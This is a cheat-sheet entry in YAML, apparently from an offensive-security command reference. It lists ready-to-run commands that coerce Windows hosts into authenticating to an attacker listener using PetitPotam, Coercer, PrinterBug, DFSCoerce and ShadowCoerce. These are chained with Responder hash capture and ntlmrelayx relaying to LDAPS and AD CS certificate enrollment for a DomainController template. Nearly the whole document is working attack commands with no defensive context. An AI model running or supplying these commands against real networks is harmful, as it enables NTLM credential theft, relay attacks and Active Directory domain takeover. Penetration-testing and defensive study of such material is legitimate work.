---
description: |
  Authentication coercion attacks — force Windows hosts to authenticate to an attacker-controlled listener using PetitPotam, PrinterBug, DFSCoerce, and ShadowCoerce for NTLM relay.
commands:
  - have: No_Creds
    cmd: |
      # PetitPotam — coerce authentication without credentials (unauthenticated)
      python3 PetitPotam.py 10.10.10.21 10.10.10.27

      # Coercer — scan for all coercion methods without credentials
      coercer scan -t 10.10.10.27 -u '' -p ''

      # Listen with Responder to capture NTLM hashes
      responder -I eth0 -v

      # Or relay with ntlmrelayx
      ntlmrelayx.py -t ldaps://10.10.10.27 -smb2support
      ntlmrelayx.py -t http://10.10.10.27/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  - have: Credentials
    cmd: |
      # PetitPotam with credentials (authenticated — more reliable)
      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.21 10.10.10.27

      # Coercer with credentials — scan and exploit
      coercer scan -t 10.10.10.27 -u sec_user -p 'P@ssw0rd' -d senshu.sh
      coercer coerce -t 10.10.10.27 -l 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.sh

      # PrinterBug / SpoolSample — coerce via Print Spooler
      python3 printerbug.py senshu.sh/sec_user:'P@ssw0rd'@10.10.10.27 10.10.10.21

      # DFSCoerce — coerce via DFS
      python3 dfscoerce.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.21 10.10.10.27

      # ShadowCoerce — coerce via File Server VSS Agent Service
      python3 shadowcoerce.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.21 10.10.10.27
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
  - RPC
techniques:
  - NTLM_Relay
references:
  - https://github.com/topotam/PetitPotam
  - https://github.com/p0dalirius/Coercer
  - https://github.com/dirkjanm/krbrelayx
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html
---
